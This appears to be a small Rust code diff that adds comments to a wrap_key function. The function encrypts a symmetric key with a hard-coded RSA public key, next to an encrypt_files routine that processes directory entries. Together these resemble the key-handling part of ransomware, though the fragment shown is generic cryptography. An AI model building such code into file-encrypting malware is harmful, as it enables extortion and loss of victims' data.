@@ -48,13 +48,16 @@ pub(crate) async fn encrypt_files(r: Receiver<DirEntry>, mut key: Vec<u8>) {
 }
 
 pub(crate) fn wrap_key(key: &Vec<u8>) -> Vec<u8> {
+    // import key
     let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
     let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();
+
+    // find output size and pre-allocate buffer
     let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
     let buffer_len = encryptor.encrypt_len(&key).unwrap();
     let mut encrypted = vec![0u8; buffer_len];
 
-    // Encrypt the data and discard its length
+    // Encrypt the data and discard its length. Return buffer.
     let _ = encryptor.encrypt(&key, &mut encrypted).unwrap();
     return encrypted;
 }
